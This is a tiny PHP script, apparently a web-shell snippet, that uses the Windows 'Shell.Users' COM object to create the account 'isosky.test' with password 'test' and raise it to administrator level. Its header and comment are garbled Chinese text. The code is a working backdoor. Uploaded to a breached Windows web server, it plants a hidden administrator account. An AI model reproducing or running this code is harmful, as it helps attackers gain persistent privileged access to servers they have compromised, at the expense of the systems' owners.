<?php
echo "<div align=center><b>PHP Shell.UsersӹԱʺ</b></div>";
$username="isosky.test";
$password="test";
$su = new COM("Shell.Users");
$h=$su->create($username);
$h->changePassword($password,"");
$h->setting["AccountType"] = 3;//Ҫ԰ûadministrators ,
?>